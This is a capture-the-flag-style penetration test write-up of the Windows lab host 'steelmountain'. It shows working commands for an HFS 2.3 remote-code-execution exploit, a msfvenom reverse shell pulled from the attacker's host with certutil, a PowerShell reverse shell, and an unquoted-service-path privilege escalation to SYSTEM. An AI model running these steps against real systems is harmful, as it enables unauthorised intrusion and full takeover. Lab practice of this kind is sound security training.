## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.249.33
# HOSTNAME // Found Post Initial foothold
steelmountain
# OPERATING SYSTEM // Found Post Initial foothold
Host Name:                 STEELMOUNTAIN
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600

# CREDENTIALS  
```
## OPEN PORTS DETAILS
```bash
80/tcp    open  http          Microsoft IIS httpd 8.5
8080/tcp  open  http          HttpFileServer httpd 2.3

135/tcp   open  msrpc         Microsoft Windows RPC

139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

3389/tcp  open  ms-wbt-server Microsoft Terminal Services

5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49164/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
```
# ENUMERATION
## PORT 139 445 SMB 
```bash
# Recon
SMB         10.10.249.33    445    STEELMOUNTAIN    [*] Windows Server 2012 R2 Datacenter 9600 x64 (name:STEELMOUNTAIN) (domain:steelmountain) (signing:False) (SMBv1:True)
OS: Windows Server 2012 R2 Datacenter 9600
OS version: '6.3'
OS release: ''
OS build: '9600'
Native OS: Windows Server 2012 R2 Datacenter 9600
Native LAN manager: Windows Server 2012 R2 Datacenter 6.3

# Commands Used
sudo nxc smb $ip 
sudo nxc smb $ip --shares 
sudo nxc smb $ip --shares -u '' -p ''
sudo nxc smb $ip --shares -u '' -p '' --local-auth
sudo smbclient -L $ip
sudo smbmap -H $ip -R --depth 5
sudo enum4linux-ng $ip
sudo enum4linux -a $ip

# Note 
- No shares
```
## PORT 80
```bash
# Recon
Summary   : HTTPServer[Microsoft-IIS/8.5], Microsoft-IIS[8.5]

# Commands used
sudo curl -I $url
sudo whatweb -v $url

# Note

```
## PORT 8080
```bash
# Recon
Summary   : Cookies[HFS_SID], HTTPServer[HFS 2.3], HttpFileServer, JQuery[1.4.4], Script[text/javascript]

# Commands used
sudo curl -I $url
sudo whatweb -v $url
searchsploit HttpFileServer

# Note
- Found exploit for HttpFileServer 2.3 [HFS 2.3]
windows/webapps/49125.py
```
## INITIAL FOOTHOLD
```bash
# Exploit 49125.py 
python3 49125.py                                                
Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command
list index out of range

- Check If the exploit able to ping our machine
sudo tcpdump -i tun0
python3 49125.py 10.10.249.33 8080 'ping -c1 10.11.127.94'

- Able to ping
06:29:06.084725 IP 10.11.127.94.41782 > 10.10.249.33.http-alt: Flags [P.], seq 1:157, ack 1, win 502, options [nop,nop,TS val 3156788473 ecr 290931], length 156: HTTP: GET /?search=%00%7B.+exec%7Cping%20-c1%2010.11.127.94.%7D HTTP/1.1

- Possible code execution 

# Reverse shell
- Generate Payload
sudo msfvenom -p windows/x64/shell_reverse_tcp lhost=10.11.127.94 lport=445 -f exe -o shell.exe
- Host it
sudo python3 -m http.server 80
- Reverse Shell
sudo rlwrap nc -nvlp 445
python3 49125.py 10.10.249.33 8080 "certutil.exe -f -urlcache http://10.11.127.94/shell.exe C:\Windows\Tasks\shell.exe"
python3 49125.py 10.10.249.33 8080 "C:\Windows\Tasks\shell.exe" 

connect to [10.11.127.94] from (UNKNOWN) [10.10.249.33] 49266
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami
whoami
steelmountain\bill

# Upgrade shell to Powershell 
- Edit Invoke-PowerShellTcp.ps1 with below
Invoke-PowerShellTcp -Reverse -IPAddress 10.11.127.94 -Port 8080

- Transfer Invoke-PowerShellTcp.ps1

sudo rlwrap nc -nvlp 8080 
C:\Windows\Tasks>powershell -ep bypass .\Invoke-PowerShellTcp.ps1
```
## PRIVILEGE ESCALATION
```bash
-  Transfer PowerUp.ps1
PS C:\Windows\Tasks> . .\PowerUp.ps1                                                          
PS C:\Windows\Tasks> Invoke-AllChecks 

- Found Service with Unquoted Service Path and Restartable Service
ServiceName    : AdvancedSystemCareService9                                                   
Path           : C:\Program Files (x86)\IObit\Advanced                                        
                 SystemCare\ASCService.exe                                                    
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users;                       
                 Permissions=AppendData/AddSubdirectory}                                      
StartName      : LocalSystem                                                                  
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path                 
                 <HijackPath>                                                                 
CanRestart     : True                                                                         
Name           : AdvancedSystemCareService9                                                   
Check          : Unquoted Service Paths                           

- Checking Folder Permission
C:\Windows\Tasks>icacls  "C:\Program Files (x86)\IObit"
icacls  "C:\Program Files (x86)\IObit"
C:\Program Files (x86)\IObit STEELMOUNTAIN\bill:(OI)(CI)(RX,W)
                             NT SERVICE\TrustedInstaller:(I)(F)
                             NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                             NT AUTHORITY\SYSTEM:(I)(F)
                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                             BUILTIN\Administrators:(I)(F)
                             BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                             BUILTIN\Users:(I)(RX)
                             BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                             CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

# Privesc
- Listener
sudo rlwrap nc -nvlp 445

- Exploit Method
C:\Windows\Tasks>copy .\shell.exe "C:\Program Files (x86)\IObit\Advanced.exe"
copy .\shell.exe "C:\Program Files (x86)\IObit\Advanced.exe"
        1 file(s) copied.

C:\Windows\Tasks>net stop AdvancedSystemCareService9
net stop AdvancedSystemCareService9
The Advanced SystemCare Service 9 service was stopped successfully.

C:\Windows\Tasks>net start AdvancedSystemCareService9
net start AdvancedSystemCareService9

sudo rlwrap nc -nvlp 445
[sudo] password for kali: 
listening on [any] 445 ...
connect to [10.11.127.94] from (UNKNOWN) [10.10.249.33] 49314
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Fri Feb  7 05:46:29 2025 as: /usr/lib/nmap/nmap -p 80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49164,49165 -sC -sV -oN nmap/scan-script-version 10.10.249.33
Nmap scan report for 10.10.249.33
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-02-07T00:17:42+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2025-02-06T00:11:41
|_Not valid after:  2025-08-08T00:11:41
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2025-02-07T00:17:37+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49164/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-07T00:17:36
|_  start_date: 2025-02-07T00:11:31
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:db:18:5b:f9:e1 (unknown)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb  7 05:47:43 2025 -- 1 IP address (1 host up) scanned in 73.26 seconds

```

